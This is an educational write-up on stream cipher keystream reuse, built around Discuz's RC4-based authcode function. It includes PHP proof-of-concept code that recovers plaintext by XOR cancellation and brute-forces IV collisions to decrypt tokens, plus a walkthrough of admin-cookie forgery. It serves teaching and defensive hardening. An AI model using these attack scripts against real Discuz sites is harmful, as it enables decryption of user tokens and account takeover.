# 47 - Stream Cipher Vulnerabilities: XOR Reuse and Discuz authcode

## XOR Encryption Fundamentals

### How XOR Encryption Works

```
E(A) = A xor C      (encrypt plaintext A with key C)
E(B) = B xor C      (encrypt plaintext B with same key C)
```

XOR has a critical mathematical property — XORing a value with itself cancels out:

```
E(A) xor E(B) = (A xor C) xor (B xor C)
              = A xor B xor C xor C
              = A xor B
```

**The key `C` disappears entirely.** If an attacker knows plaintext A and has both ciphertexts, they can recover plaintext B without ever knowing the key:

```
E(A) xor E(B) = A xor B

If attacker knows A:
  A xor (A xor B) = B    ← recovered!
```

This is the **stream cipher reuse vulnerability** — reusing the same keystream to encrypt two different messages lets an attacker recover both.

## Discuz authcode — A Real-World Vulnerable Implementation

Discuz (a popular Chinese forum software) uses a custom `authcode()` function based on RC4 stream cipher for encrypting cookies and tokens.

### The Function Structure

```php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    // $string:    plaintext (when encrypting) or ciphertext (when decrypting)
    // $operation: 'DECODE' = decrypt, anything else = encrypt
    // $key:       the user-provided secret key
    // $expiry:    ciphertext expiration time in seconds (0 = never expires)

    $ckey_length = 4;  // IV length — 4 random chars prepended to ciphertext
                       // ensures same plaintext + same key → different ciphertext each time
                       // set to 0 = no IV = VULNERABLE to keystream reuse

    // Step 1: Derive two sub-keys from the master key using MD5
    $key  = md5($key ? $key : UC_KEY);        // if no key provided, use global UC_KEY
                                               // MD5 produces 32 hex chars (128 bits)
    $keya = md5(substr($key, 0, 16));          // first half → MD5 → encryption sub-key
                                               // used to build the RC4 keystream
    $keyb = md5(substr($key, 16, 16));         // second half → MD5 → integrity sub-key
                                               // used to create a hash for tamper detection
```

**Key derivation:**
- Master key → MD5 → split into two halves
- `$keya` — participates in generating the RC4 keystream
- `$keyb` — used to create an integrity hash (not for encryption)

### The IV (Initialization Vector) — `$keyc`

**IV = Initialization Vector** — a random value added before each encryption to ensure that the same plaintext + same key produces a **different ciphertext** every time.

**Why it matters — a simple example:**

```
Without IV (deterministic — DANGEROUS):
  encrypt("hello", key="secret") → always "x8f2a"
  encrypt("hello", key="secret") → always "x8f2a"   ← same!

  Problem: attacker sees "x8f2a" twice → knows the same message was sent twice
  Problem: same keystream every time → XOR cancellation attack works

With IV (randomized — SAFE):
  encrypt("hello", key="secret", IV="a3f2") → "k9m1p"
  encrypt("hello", key="secret", IV="b7c1") → "q4j8r"   ← different!

  Different IV → different keystream → different ciphertext
  Attacker can't tell both ciphertexts contain "hello"
  XOR cancellation only works if two ciphertexts happen to share the same IV
```

**How IV is stored and transmitted:**

```
Encryption:
  1. Generate random IV: "a3f2"
  2. Use (key + IV) to create keystream
  3. XOR plaintext with keystream → ciphertext
  4. Prepend IV to ciphertext: "a3f2" + ciphertext
     ↑ IV is NOT secret — it just needs to be unique

Decryption:
  1. Read first 4 chars: IV = "a3f2"
  2. Use (key + IV) to recreate the SAME keystream
  3. XOR ciphertext with keystream → plaintext

The IV is sent in the clear (unencrypted) alongside the ciphertext.
This is safe — the IV doesn't need to be secret, it only needs to be
different each time. Knowing the IV without the key is useless.
```

```php
$ckey_length = 4;  // IV = 4 random characters

// Generate or read the IV ($keyc) depending on encrypt/decrypt
$keyc = $ckey_length
    ? ($operation == 'DECODE'
        // DECRYPTING: the IV was stored as the first 4 chars of the ciphertext
        // read it back so we can reconstruct the same keystream
        ? substr($string, 0, $ckey_length)

        // ENCRYPTING: generate a fresh random IV from current microsecond time
        // md5(microtime()) = 32-char hash of current time
        // take the last 4 chars as our IV
        // this means encrypting "hello" twice gives different ciphertexts
        : substr(md5(microtime()), -$ckey_length))

    // If $ckey_length = 0: no IV at all (empty string)
    // DANGEROUS: same key → same keystream every time
    : '';

// Build the actual RC4 key by combining keya with a hash that includes the IV
// Different IV → different md5 output → different RC4 key → different keystream
$cryptkey = $keya . md5($keya . $keyc);
// Example with IV "a3f2": cryptkey = keya + md5(keya + "a3f2")
// Example with IV "b7c1": cryptkey = keya + md5(keya + "b7c1")  ← different!
```

- On encryption: `$keyc` = 4 random characters from `md5(microtime())`
- On decryption: `$keyc` = first 4 characters of the ciphertext (where IV was stored)
- `$cryptkey` = `$keya` + `md5($keya + $keyc)` — the actual RC4 key

The IV ensures that encrypting the same plaintext twice produces different ciphertexts (different `$keyc` → different `$cryptkey` → different keystream).

### The Plaintext Format Before Encryption

```php
// Before encryption, prepend metadata to the plaintext:
//   - 10-digit expiry timestamp (or "0000000000" if no expiry)
//   - 16-char MD5 hash of (plaintext + keyb) for integrity verification on decrypt
$string = sprintf('%010d', $expiry ? $expiry + time() : 0)
        // ↑ If expiry=3600, stores current time + 3600 (1 hour from now)
        //   If expiry=0, stores "0000000000" (never expires)
        //   On decrypt, if this timestamp < current time → expired, reject

        . substr(md5($string . $keyb), 0, 16)
        // ↑ First 16 chars of MD5(plaintext + keyb)
        //   On decrypt, recalculate this hash and compare
        //   If they don't match → data was tampered with, reject
        //   $keyb is secret, so attacker can't forge a valid hash

        . $string;
        // ↑ The actual plaintext comes last
```

```
┌──────────────┬──────────────────┬───────────────┐
│ 10-digit      │ 16-char MD5      │ actual        │
│ expiry time   │ integrity hash   │ plaintext     │
│ (0 = never)   │ (of plain+keyb)  │               │
├──────────────┼──────────────────┼───────────────┤
│ position 0-9  │ position 10-25   │ position 26+  │
└──────────────┴──────────────────┴───────────────┘
```

### The RC4 Core — XOR Encryption

```php
// ============================================================
// RC4 Key Scheduling Algorithm (KSA)
// Initializes a 256-byte permutation table ($box) using the key
// This is standard RC4 — the same key always produces the same
// initial permutation, which is why the IV matters
// ============================================================

$box = range(0, 255);    // $box = [0, 1, 2, 3, ..., 255]
                          // this is the "S-box" — a permutation of all byte values

$rndkey = array();
for ($i = 0; $i <= 255; $i++) {
    // Convert each character of $cryptkey to its ASCII value
    // $cryptkey is cycled if shorter than 256 chars (% $key_length wraps around)
    // Example: if cryptkey = "abcd" (length 4)
    //   $rndkey[0] = ord('a')=97, $rndkey[4] = ord('a')=97, etc.
    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
}

// Shuffle the S-box based on the key
// After this loop, $box is a key-dependent permutation of 0-255
// Same $cryptkey → same shuffle → same permutation → same keystream
for ($j = $i = 0; $i < 256; $i++) {
    $j = ($j + $box[$i] + $rndkey[$i]) % 256;  // key-dependent index
    // Swap $box[$i] and $box[$j]
    $tmp = $box[$i];
    $box[$i] = $box[$j];
    $box[$j] = $tmp;
}

// ============================================================
// RC4 Pseudo-Random Generation Algorithm (PRGA)
// Generates one keystream byte per plaintext byte, then XORs them
// This is where the actual encryption/decryption happens
// (RC4 is symmetric: encrypt and decrypt are the same XOR operation)
// ============================================================

for ($a = $j = $i = 0; $i < $string_length; $i++) {
    $a = ($a + 1) % 256;              // increment index a (wraps at 256)
    $j = ($j + $box[$a]) % 256;       // compute index j based on S-box value

    // Swap $box[$a] and $box[$j] — continuously shuffles the S-box
    $tmp = $box[$a];
    $box[$a] = $box[$j];
    $box[$j] = $tmp;

    // Generate one keystream byte:
    //   $box[$a] + $box[$j] → index into S-box → keystream byte
    // XOR it with one plaintext byte → one ciphertext byte
    // On decrypt: XOR ciphertext byte with same keystream byte → plaintext byte
    // (because A xor K xor K = A)
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    //          ↑ plaintext/ciphertext    ↑ keystream byte from S-box lookup
    //            byte (input)              (deterministic for same key+IV)
}
```

The core operation is simple XOR:

```php
$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
//          plaintext byte          XOR    keystream byte
```

## The Attack: XOR Key Reuse When IV Is Disabled

### Vulnerable Configuration

```php
$ckey_length = 0;  // IV disabled!
```

When `$ckey_length = 0`, there's no random IV. The same key always produces the **same keystream**. Every encryption uses the same XOR key.

### Proof of Concept

```php
<?php
define('UC_KEY', 'aaaaaaaaaaaaaaaaaaaaaaaaaaa');  // the shared secret key

$plaintext1 = "aaaabbbb";  // known plaintext (attacker knows this value)
$plaintext2 = "ccccbbbb";  // target plaintext (attacker wants to recover this)

// Encrypt both plaintexts with the SAME key and NO IV ($ckey_length = 0 inside)
// Because there's no IV, both encryptions use the SAME keystream
$cipher1 = base64_decode(substr(authcode($plaintext1, "ENCODE", UC_KEY), 0));
// ↑ authcode returns: base64(IV + encrypted_data)
//   substr(..., 0) = full string (no IV prefix when ckey_length=0)
//   base64_decode = get raw ciphertext bytes

$cipher2 = base64_decode(substr(authcode($plaintext2, "ENCODE", UC_KEY), 0));
// ↑ same keystream used! because same key + no IV = identical RC4 output

// THE ATTACK: recover plaintext2 using known plaintext1 + both ciphertexts
// No key needed! Pure XOR math.
echo "crack result is: " . crack($plaintext1, $cipher1, $cipher2);
// Output: "ccccbbbb" — the secret plaintext2 is fully recovered
```

### The Crack Function

```php
function crack($plain, $cipher_p, $cipher_t) {
    // $plain:    known plaintext   ("aaaabbbb" — attacker knows this)
    // $cipher_p: ciphertext of known plaintext (encrypted "aaaabbbb")
    // $cipher_t: ciphertext of target plaintext (encrypted "ccccbbbb" — want to recover)
    $target = '';

    // Skip the first 26 bytes of each ciphertext
    // Recall the plaintext format before encryption:
    //   bytes 0-9:   expiry timestamp (10 chars)
    //   bytes 10-25: integrity hash   (16 chars)
    //   bytes 26+:   actual plaintext
    // We only care about the actual plaintext portion (position 26 onward)
    $tmp_p = substr($cipher_p, 26);  // encrypted bytes of "aaaabbbb"
    $tmp_t = substr($cipher_t, 26);  // encrypted bytes of "ccccbbbb"

    // The XOR cancellation attack:
    // For each byte position i:
    //   $tmp_p[$i] = $plain[$i] XOR keystream[$i]   (encrypted known plaintext)
    //   $tmp_t[$i] = target[$i] XOR keystream[$i]   (encrypted target plaintext)
    //
    //   $plain[$i] XOR $tmp_p[$i] XOR $tmp_t[$i]
    //   = $plain[$i] XOR ($plain[$i] XOR keystream[$i]) XOR (target[$i] XOR keystream[$i])
    //   = $plain[$i] XOR $plain[$i] XOR keystream[$i] XOR target[$i] XOR keystream[$i]
    //     ↑ cancels to 0            ↑ cancels to 0
    //   = target[$i]               ← recovered!
    for ($i = 0; $i < strlen($plain); $i++) {
        $target .= chr(
            ord($plain[$i])   // known plaintext byte (e.g., 'a' = 0x61)
            ^ ord($tmp_p[$i]) // encrypted known byte (plaintext XOR keystream)
            ^ ord($tmp_t[$i]) // encrypted target byte (target XOR keystream)
            // result: target plaintext byte (keystream cancels out)
        );
    }
    return $target;  // returns "ccccbbbb" — the recovered secret!
}
```

### Why This Works — Step by Step

```
Given:
  C = keystream (same for both because IV is disabled)
  E(A) = A xor C     (cipher of plaintext1 "aaaabbbb")
  E(B) = B xor C     (cipher of plaintext2 "ccccbbbb")

The crack computes:
  A xor E(A) xor E(B)
  = A xor (A xor C) xor (B xor C)
  = A xor A xor C xor B xor C
  = C xor B xor C          (A xor A cancels)
  = B                       (C xor C cancels)

Result:
  aaaabbbb XOR cipher1_bytes XOR cipher2_bytes = ccccbbbb ✓
```

The attacker recovers `plaintext2` ("ccccbbbb") without knowing the key, using only:
- A known plaintext (`plaintext1`)
- Both ciphertexts

### The IV Defense — Why `$ckey_length = 4` Matters

```
With IV ($ckey_length = 4):
  Encryption 1: keystream = RC4(keya + md5(keya + "a3f2"))  → keystream_1
  Encryption 2: keystream = RC4(keya + md5(keya + "b7c1"))  → keystream_2
  Different keystreams → XOR cancellation doesn't work → attack fails

Without IV ($ckey_length = 0):
  Encryption 1: keystream = RC4(keya + md5(keya + ""))  → keystream_X
  Encryption 2: keystream = RC4(keya + md5(keya + ""))  → keystream_X (SAME!)
  Same keystream → XOR cancellation works → attack succeeds
```

The 4-byte IV provides `16^4 = 65,536` possible keystreams. Each encryption picks a random one, making keystream reuse unlikely (but not impossible with enough ciphertexts — birthday problem).

## Practical Attack: Forging an Admin Cookie

### Beyond Decryption — Crafting New Ciphertexts

The XOR property also works in reverse. Not only can the attacker **decrypt**, they can also **forge** a valid ciphertext for any plaintext they choose:

```
Decryption attack:
  E(A) xor E(B) = A xor B
  → If you know A, you can recover B

Forgery attack:
  A xor E(A) xor B = E(B)
  → If you know A and E(A), you can create E(B) for any chosen B
```

The second equation means: if you know plaintext A and its ciphertext E(A), you can compute the ciphertext for **any** plaintext B without knowing the key.

### Attack Scenario: Cookie Forgery

Suppose Discuz stores user identity in an encrypted cookie:

```
Cookie value = authcode(username+role, "ENCODE", UC_KEY)
```

The attacker has their own account and knows:
- Their plaintext: `accountA+member`
- Their cookie: `Cookie(A)`

Target:
- Admin plaintext: `admin_account+manager`

Forgery formula:
```
Cookie(admin) = (accountA+member) xor Cookie(A) xor (admin_account+manager)
```

**Step by step:**

```
The attacker computes:
  Known plaintext:     "accountA+member"           = A
  Known ciphertext:    Cookie(A)                    = E(A) = A xor Keystream
  Target plaintext:    "admin_account+manager"      = B

  A xor E(A) = Keystream                            (recover the keystream)
  Keystream xor B = E(B)                            (encrypt target with same keystream)

  Or in one step:
  A xor E(A) xor B = E(B) = Cookie(admin)

The attacker replaces their cookie with Cookie(admin)
→ Server decrypts it → gets "admin_account+manager"
→ Attacker is now admin!
```

### But Wait — The Integrity Check

The authcode decryption function has an integrity verification step:

```php
if ($operation == 'DECODE') {
    // Two-step verification:
    if (
        // 1. Check expiry: substr($result, 0, 10) = timestamp
        //    Pass if: 0 (no expiry) OR timestamp > current time
        (substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0)

        &&

        // 2. Check integrity: substr($result, 10, 16) = stored hash
        //    Recalculate: md5(plaintext + keyb)
        //    Pass if: stored hash == recalculated hash
        substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)
    ) {
        return substr($result, 26);  // valid → return plaintext
    } else {
        return '';  // tampered/expired → reject
    }
}
```

### Does the Integrity Hash Stop the Forgery?

The integrity hash is:

```php
md5(plaintext . $keyb)
```

**The attacker doesn't know `$keyb`**, so they can't compute the correct hash for forged plaintext.

When the attacker forges the ciphertext using XOR, they can control bytes 26+ (the plaintext), but bytes 10-25 (the integrity hash) will **also** be XOR-forged — and the result will be a garbage hash that doesn't match `MD5(new_plaintext + keyb)`.

```
Forged ciphertext decrypts to:
┌──────────────┬──────────────────┬─────────────────────────┐
│ expiry (ok)   │ hash (GARBAGE!)  │ admin_account+manager   │
│ 0000000000    │ 7f3a...wrong     │ (attacker's target)     │
├──────────────┼──────────────────┼─────────────────────────┤
│ position 0-9  │ position 10-25   │ position 26+            │
└──────────────┴──────────────────┴─────────────────────────┘

Server recalculates: MD5("admin_account+manager" + keyb) = "a9c1...correct"
Stored hash:         "7f3a...wrong"
→ MISMATCH → rejected!
```

**So the integrity hash (`$keyb`) prevents naive XOR forgery.** The attacker can craft the plaintext portion, but the hash verification catches the tampering.

### When the Attack Still Works

The integrity check **does** protect against forgery in authcode — but only if:

1. **`$keyb` is secret** — if it leaks (via another vulnerability, config exposure, etc.), the attacker can compute valid hashes
2. **The hash comparison is secure** — the `==` comparison in PHP has type juggling issues; in some edge cases `"0e123..." == "0e456..."` evaluates to true (both parsed as scientific notation = 0)
3. **The entire system uses authcode** — if some other part of the system uses the same key with plain XOR (no integrity hash), that part is fully vulnerable

The XOR reuse attack is most dangerous when:
- The IV is disabled (`$ckey_length = 0`)
- The encryption has **no integrity check** (pure XOR/RC4 without a MAC)
- The attacker has a known-plaintext/ciphertext pair

## Attacking With IV Enabled — Dictionary/Birthday Attack

Even with `$ckey_length = 4` (IV enabled), the attack is still possible. The IV has only `16^4 = 65,536` possible values. The attacker can **collect ciphertexts until two share the same IV**, then apply the XOR cancellation.

### The Dictionary Attack — Full PoC

```php
<?php
define('UC_KEY', 'aaaaaaaaaaaaaaaaaaaaaaaaaaa');

$plaintext1 = "aaaabbbbxxxx";   // known plaintext (attacker controls this)
$plaintext2 = "ccccbbbbcccc";   // target plaintext (attacker wants to recover)

$guess_result = "";
$time_start = time();

$dict = array();         // dictionary: maps IV → ciphertext
global $ckey_length;
$ckey_length = 4;        // IV is enabled! 4 hex chars = 65,536 possible values

echo "Collecting Dictionary(XOR Keys).\n";

// Step 1: Encrypt the TARGET plaintext once
// The attacker needs the target ciphertext — in practice this could be
// a cookie, token, or any encrypted value they've intercepted
$cipher2 = authcode($plaintext2, "ENCODE", UC_KEY);

// Step 2: Repeatedly encrypt the KNOWN plaintext until we find
// a ciphertext that used the same IV as cipher2
$counter = 0;
for (;;) {
    $counter++;

    // Encrypt our known plaintext — each call generates a RANDOM IV
    $cipher1 = authcode($plaintext1, "ENCODE", UC_KEY);

    // Extract the IV (first 4 chars, prepended to the ciphertext)
    $keyc1 = substr($cipher1, 0, $ckey_length);

    // Decode the rest to get raw ciphertext bytes
    $cipher1 = base64_decode(substr($cipher1, $ckey_length));

    // Store in dictionary: IV → ciphertext
    // We're building a lookup table of all IVs we've seen
    $dict[$keyc1] = $cipher1;

    // Every 1000 attempts, check if we've found a matching IV
    if ($counter % 1000 == 0) {
        echo ".";
        if ($guess_result = guess($dict, $cipher2)) {
            break;  // IV collision found! Attack succeeded
        }
    }
}

array_unique($dict);

echo "\nDictionary Collecting Finished..\n";
echo "Collected " . count($dict) . " XOR Keys\n";

// Step 3: Check if any collected IV matches the target's IV
function guess($dict, $cipher2) {
    global $plaintext1, $ckey_length;

    // Extract the IV from the target ciphertext
    $keyc2 = substr($cipher2, 0, $ckey_length);
    $cipher2 = base64_decode(substr($cipher2, $ckey_length));

    // Look up: do we have a ciphertext in our dictionary with the SAME IV?
    // Same IV + same key → same keystream → XOR cancellation works!
    for ($i = 0; $i < count($dict); $i++) {
        if (array_key_exists($keyc2, $dict)) {
            echo "\nFound key in dictionary!\n";
            echo "keyc is: " . $keyc2 . "\n";
            // We found a match! Both ciphertexts used the same IV
            // → same keystream → crack it with XOR cancellation
            return crack($plaintext1, $dict[$keyc2], $cipher2);
            break;
        }
    }
    return False;  // no matching IV found yet, keep collecting
}

echo "\ncounter is:" . $counter . "\n";
$time_spend = time() - $time_start;
echo "crack time is: " . $time_spend . " seconds\n";
echo "crack result is: " . $guess_result . "\n";

// Step 4: XOR cancellation — same as before
// Works because both ciphertexts share the same IV → same keystream
function crack($plain, $cipher_p, $cipher_t) {
    $target = '';

    // Skip 26-byte header (10 expiry + 16 integrity hash)
    $tmp_p = substr($cipher_p, 26);  // encrypted known plaintext bytes
    $tmp_t = substr($cipher_t, 26);  // encrypted target plaintext bytes

    // XOR cancellation: plain XOR E(plain) XOR E(target) = target
    for ($i = 0; $i < strlen($plain); $i++) {
        $target .= chr(ord($plain[$i]) ^ ord($tmp_p[$i]) ^ ord($tmp_t[$i]));
    }
    return $target;
}
?>
```

### How the Dictionary Attack Works

```
The IV space is small: 4 hex chars = 16^4 = 65,536 possible values

Strategy:
  1. Intercept target ciphertext (cipher2) — note its IV
  2. Repeatedly encrypt known plaintext (cipher1) — each time gets a random IV
  3. Store each (IV → ciphertext) pair in a dictionary
  4. Check: does any collected IV match the target's IV?
  5. When a match is found: same IV → same keystream → XOR crack

Timeline:
  cipher2 IV = "a3f2"

  Attempt 1:    cipher1 IV = "7bc1"  → no match, store in dict
  Attempt 2:    cipher1 IV = "f09e"  → no match, store in dict
  ...
  Attempt N:    cipher1 IV = "a3f2"  → MATCH! Same keystream!
                → crack(plaintext1, dict["a3f2"], cipher2) = plaintext2 ✓
```

### Birthday Problem — How Many Attempts?

With 65,536 possible IVs, by the **birthday paradox**, a collision becomes likely after approximately `sqrt(65536) ≈ 256` ciphertexts. In practice, with a targeted match (looking for one specific IV), the expected number of attempts is **~65,536 / 2 ≈ 32,768**.

This is trivially fast — a few seconds of computation:

```
counter is: ~30000-40000
crack time is: 2-5 seconds
crack result is: ccccbbbbcccc ✓
```

### Why This Means `$ckey_length = 4` Is Weak

| IV length | Possible IVs | Expected attempts to match | Time |
|-----------|-------------|---------------------------|------|
| 0 (none) | 1 | 1 (instant) | ~0 seconds |
| 4 | 65,536 | ~32,768 | ~2-5 seconds |
| 8 | ~4 billion | ~2 billion | Impractical |
| 16 | ~3.4 × 10^38 | Astronomically large | Impossible |

A 4-character IV is better than nothing but far too small for real security. Modern ciphers use 12-16 byte nonces (96-128 bits).

## Key Takeaways

| Principle | Explanation |
|-----------|-------------|
| **Never reuse a stream cipher keystream** | Same key + same IV = same keystream = XOR cancellation attack |
| **Always use an IV/nonce** | Random IV ensures different keystreams even with the same key |
| **Known-plaintext attack** | If attacker knows ANY plaintext encrypted with the same keystream, they can decrypt ALL other ciphertexts |
| **Don't roll your own crypto** | Discuz's authcode is a custom RC4 wrapper with structural weaknesses; use AES-GCM or ChaCha20-Poly1305 instead |
